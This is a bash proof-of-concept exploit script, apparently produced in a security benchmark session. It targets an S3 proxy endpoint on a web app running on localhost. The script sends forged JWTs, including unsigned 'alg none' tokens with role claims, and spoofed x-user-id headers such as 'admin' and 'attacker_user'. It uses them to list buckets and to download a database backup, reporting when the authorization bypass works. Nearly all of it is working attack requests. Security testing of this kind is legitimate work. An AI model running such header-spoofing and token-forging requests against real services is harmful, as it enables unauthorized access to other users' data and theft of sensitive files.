#!/bin/bash
# POC: Demonstrates horizontal privilege escalation by accessing other users' resources through the S3 proxy endpoint without proper authorization checks
# Target: ./repo
# Created: 2025-11-07T16:16:44.161Z
# Session: benchmark-XBEN-084-24-mhp1efma

# Horizontal Privilege Escalation POC - S3 Proxy Authorization Bypass
# Demonstrates that users can access resources they shouldn't have access to

TARGET_URL="${TARGET_URL:-http://localhost:3000}"
S3_ENDPOINT="${TARGET_URL}/s3"

echo "=========================================="
echo "Horizontal Privilege Escalation POC"
echo "=========================================="
echo ""

# Test 1: Create JWT tokens for different users and verify all can access same buckets
echo "[TEST 1] Same bucket access with different user tokens"
echo "Creating JWT token for user1..."

# Create a basic JWT token for user1 (kid=user1)
# JWT with user1 identity
USER1_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJraWQiOiJ1c2VyMSIsInN1YiI6InVzZXIxIn0.test"

echo "User1 token: $USER1_TOKEN"
echo ""

# Test accessing buckets with user1 token
echo "Accessing /s3 with user1 token (x-auth-token header)..."
RESPONSE1=$(curl -s -H "x-auth-token: $USER1_TOKEN" "$S3_ENDPOINT")
BUCKET_COUNT1=$(echo "$RESPONSE1" | grep -o "<Name>" | wc -l)
echo "HTTP Response Status: $(curl -s -o /dev/null -w "%{http_code}" -H "x-auth-token: $USER1_TOKEN" "$S3_ENDPOINT")"
echo "Buckets accessible: $BUCKET_COUNT1"
echo ""

# Test 2: Set x-user-id to different values and verify bucket access
echo "[TEST 2] Arbitrary x-user-id header values grant same bucket access"
echo ""

for USER_ID in "user1" "user2" "admin" "regularuser" "superadmin"
do
    echo "Testing with x-user-id: $USER_ID"
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "x-user-id: $USER_ID" -H "x-auth-token: fake_token" "$S3_ENDPOINT")
    echo "  HTTP Status: $HTTP_CODE"
done

echo ""
echo "[TEST 3] Accessing specific buckets with spoofed user ID"
echo ""

# Test accessing the 'gold' bucket with different user IDs
BUCKETS=("assets" "backups" "gold")

for BUCKET in "${BUCKETS[@]}"
do
    echo "Bucket: $BUCKET"
    
    # Try with user1
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "x-user-id: user1" -H "x-auth-token: token1" "$S3_ENDPOINT/$BUCKET")
    echo "  Access with x-user-id=user1: HTTP $HTTP_CODE"
    
    # Try with user2
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "x-user-id: user2" -H "x-auth-token: token2" "$S3_ENDPOINT/$BUCKET")
    echo "  Access with x-user-id=user2: HTTP $HTTP_CODE"
    
    # Try with admin
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "x-user-id: admin" -H "x-auth-token: token_admin" "$S3_ENDPOINT/$BUCKET")
    echo "  Access with x-user-id=admin: HTTP $HTTP_CODE"
    
    echo ""
done

echo "[TEST 4] No per-user filtering - all users see same buckets"
echo ""

# Get bucket listing for different users
for USER_ID in "user1" "user2" "user3"
do
    echo "Bucket listing for user: $USER_ID"
    RESPONSE=$(curl -s -H "x-user-id: $USER_ID" -H "x-auth-token: token_$USER_ID" "$S3_ENDPOINT")
    
    # Extract and display bucket names
    BUCKETS_FOUND=$(echo "$RESPONSE" | grep -oP '(?<=<Name>)[^<]+' 2>/dev/null || echo "")
    if [ -z "$BUCKETS_FOUND" ]; then
        echo "  Could not parse buckets from response"
    else
        echo "  Buckets: $BUCKETS_FOUND"
    fi
    echo ""
done

echo "[TEST 5] Cross-user resource access verification"
echo ""

# This test attempts to access objects in buckets that shouldn't be accessible
echo "Attempting to access database backup (should be restricted to authorized users only):"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "x-user-id: attacker_user" -H "x-auth-token: forged_token" "$S3_ENDPOINT/backups/manapool.db")
echo "Access to backups/manapool.db with spoofed user: HTTP $HTTP_CODE"

if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABILITY CONFIRMED: Unauthorized user can access sensitive database file"
else
    echo "✗ Access denied (expected: HTTP 200, got: HTTP $HTTP_CODE)"
fi

echo ""
echo "[TEST 6] Verify no role-based filtering"
echo ""

# Test that role claims in JWT don't restrict access
echo "Creating tokens with different role claims..."

# Token claiming to be regular user
REGULAR_TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoidXNlciJ9."
# Token claiming to be admin
ADMIN_TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ."

echo "Regular user token accessing buckets..."
REGULAR_HTTP=$(curl -s -o /dev/null -w "%{http_code}" -H "x-auth-token: $REGULAR_TOKEN" "$S3_ENDPOINT")
echo "  HTTP Status: $REGULAR_HTTP"

echo "Admin token accessing same buckets..."
ADMIN_HTTP=$(curl -s -o /dev/null -w "%{http_code}" -H "x-auth-token: $ADMIN_TOKEN" "$S3_ENDPOINT")
echo "  HTTP Status: $ADMIN_HTTP"

if [ "$REGULAR_HTTP" = "$ADMIN_HTTP" ]; then
    echo "✓ VULNERABILITY CONFIRMED: Role claims don't enforce access restrictions"
else
    echo "✗ Different access levels detected"
fi

echo ""
echo "=========================================="
echo "POC Execution Complete"
echo "=========================================="